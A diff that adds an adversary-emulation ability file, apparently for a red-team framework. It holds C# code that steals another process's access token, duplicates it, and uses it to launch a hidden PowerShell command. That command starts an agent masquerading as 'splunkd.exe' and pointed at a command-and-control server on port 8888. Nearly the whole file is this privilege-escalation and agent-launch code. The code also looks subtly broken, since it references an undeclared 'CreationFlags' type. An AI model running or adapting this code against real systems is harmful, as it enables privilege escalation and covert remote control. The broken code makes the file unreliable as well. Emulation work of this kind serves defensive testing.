@@ -1,0 +1,167 @@
+- id: ccb0d51b-7b34-436f-897a-d76fb7323e73
+  name: Create Process with Token
+  description: steal the access token of another process to create a new process which will run an agent
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1134.002
+    name: Create Process with Token
+  platform:
+    windows: 
+      psh,cmd:
+        build_target: token.exe
+        language: csharp
+        code: |
+          using System;
+          using System.Diagnostics;
+          using System.Runtime.InteropServices;
+
+          namespace TokenTheft
+          {
+
+              class TokenTheft{
+
+                  [Flags]
+                  public enum ProcessAccessFlags : uint
+                  {
+                      All = 0x001F0FFF,
+                      Terminate = 0x00000001,
+                      CreateThread = 0x00000002,
+                      VirtualMemoryOperation = 0x00000008,
+                      VirtualMemoryRead = 0x00000010,
+                      VirtualMemoryWrite = 0x00000020,
+                      DuplicateHandle = 0x00000040,
+                      CreateProcess = 0x00000080,
+                      SetQuota = 0x00000100,
+                      SetInformation = 0x00000200,
+                      QueryInformation = 0x00000400,
+                      QueryLimitedInformation = 0x00001000,
+                      Synchronize = 0x00100000,
+                  }
+
+                  public enum SECURITY_IMPERSONATION_LEVEL {
+                      SecurityAnonymous,
+                      SecurityIdentification,
+                      SecurityImpersonation,
+                      SecurityDelegation
+                  }
+
+                  public enum TOKEN_TYPE {
+                      TokenPrimary = 1,
+                      TokenImpersonation
+                  }
+
+                  [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+                  public struct STARTUPINFO {
+                      public Int32 cb;
+                      public string lpReserved;
+                      public string lpDesktop;
+                      public string lpTitle;
+                      public Int32 dwX;
+                      public Int32 dwY;
+                      public Int32 dwXSize;
+                      public Int32 dwYSize;
+                      public Int32 dwXCountChars;
+                      public Int32 dwYCountChars;
+                      public Int32 dwFillAttribute;
+                      public Int32 dwFlags;
+                      public Int16 wShowWindow;
+                      public Int16 cbReserved2;
+                      public IntPtr lpReserved2;
+                      public IntPtr hStdInput;
+                      public IntPtr hStdOutput;
+                      public IntPtr hStdError;
+                  }
+
+                  [StructLayout(LayoutKind.Sequential)]
+                  public struct PROCESS_INFORMATION{
+                      public IntPtr hProcess;
+                      public IntPtr hThread;
+                      public int dwProcessId;
+                      public int dwThreadId;
+                  }
+
+                  [Flags]
+                  public enum LogonFlags
+                  {
+                      LOGON_WITH_PROFILE     = 0x00000001,
+                      LOGON_NETCREDENTIALS_ONLY  = 0x00000002    
+                  }
+
+                  [StructLayout(LayoutKind.Sequential)]
+                  public struct SECURITY_ATTRIBUTES
+                  {
+                      public int nLength;
+                      public IntPtr lpSecurityDescriptor;
+                      public int bInheritHandle;
+                  }
+
+                  [Flags]
+                  public enum CreateProcessFlags : uint
+                  {
+                      DEBUG_PROCESS                       = 0x00000001,
+                      DEBUG_ONLY_THIS_PROCESS             = 0x00000002,
+                      CREATE_SUSPENDED                    = 0x00000004,
+                      DETACHED_PROCESS                    = 0x00000008,
+                      CREATE_NEW_CONSOLE                  = 0x00000010,
+                      NORMAL_PRIORITY_CLASS               = 0x00000020,
+                      IDLE_PRIORITY_CLASS                 = 0x00000040,
+                      HIGH_PRIORITY_CLASS                 = 0x00000080,
+                      REALTIME_PRIORITY_CLASS             = 0x00000100,
+                      CREATE_NEW_PROCESS_GROUP            = 0x00000200,
+                      CREATE_UNICODE_ENVIRONMENT          = 0x00000400,
+                      CREATE_SEPARATE_WOW_VDM             = 0x00000800,
+                      CREATE_SHARED_WOW_VDM               = 0x00001000,
+                      CREATE_FORCEDOS                     = 0x00002000,
+                      BELOW_NORMAL_PRIORITY_CLASS         = 0x00004000,
+                      ABOVE_NORMAL_PRIORITY_CLASS         = 0x00008000,
+                      INHERIT_PARENT_AFFINITY             = 0x00010000,
+                      INHERIT_CALLER_PRIORITY             = 0x00020000,
+                      CREATE_PROTECTED_PROCESS            = 0x00040000,
+                      EXTENDED_STARTUPINFO_PRESENT        = 0x00080000,
+                      PROCESS_MODE_BACKGROUND_BEGIN       = 0x00100000,
+                      PROCESS_MODE_BACKGROUND_END         = 0x00200000,
+                      CREATE_BREAKAWAY_FROM_JOB           = 0x01000000,
+                      CREATE_PRESERVE_CODE_AUTHZ_LEVEL    = 0x02000000,
+                      CREATE_DEFAULT_ERROR_MODE           = 0x04000000,
+                      CREATE_NO_WINDOW                    = 0x08000000,
+                      PROFILE_USER                        = 0x10000000,
+                      PROFILE_KERNEL                      = 0x20000000,
+                      PROFILE_SERVER                      = 0x40000000,
+                      CREATE_IGNORE_SYSTEM_DEFAULT        = 0x80000000,
+                  }
+
+                  public const uint TOKEN_ALL_ACCESS = 983551;
+                  
+                  [DllImport("kernel32.dll", SetLastError = true)]
+                  public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int PID_TO_IMPERSONATE);
+
+                  [DllImport("advapi32.dll", SetLastError=true)]
+                  [return: MarshalAs(UnmanagedType.Bool)]
+                  public static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);
+
+                  [DllImport("advapi32.dll", CharSet=CharSet.Auto, SetLastError=true)]
+                  [return: MarshalAs(UnmanagedType.Bool)]
+                  public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, ref SECURITY_ATTRIBUTES lpTokenAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType, out IntPtr phNewToken );
+
+                  [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+                  [return: MarshalAs(UnmanagedType.Bool)]
+                  public static extern bool CreateProcessWithTokenW(IntPtr hToken, LogonFlags dwLogonFlags, string lpApplicationName, string lpCommandLine, CreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+                  static void Main(string[] args)
+                  {
+                      uint PID_TO_IMPERSONATE = 5072;
+                      IntPtr tokenHandle = new IntPtr();
+                      IntPtr duplicateTokenHandle = new IntPtr();
+
+                      IntPtr processHandle = OpenProcess(ProcessAccessFlags.All, true, PID_TO_IMPERSONATE);
+                      OpenProcessToken(processHandle, TOKEN_ALL_ACCESS, out tokenHandle);
+
+                      SECURITY_ATTRIBUTES securityAttributes = new SECURITY_ATTRIBUTES();
+                      DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, ref securityAttributes, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary, out duplicateTokenHandle);
+                      
+                      PROCESS_INFORMATION processInformation = new PROCESS_INFORMATION();
+                      STARTUPINFO startupInfo = new STARTUPINFO();
+                      CreateProcessWithTokenW(duplicateTokenHandle, LogonFlags.LOGON_WITH_PROFILE, null, "powershell -Command \"& {Start-Process -FilePath C:\\Users\\Public\\splunkd.exe -ArgumentList '-server http://10.20.1.60:8888 -group test' -WindowStyle hidden;}", 0, IntPtr.Zero, null, ref startupInfo, out processInformation);
+                  }
+              }
+          }
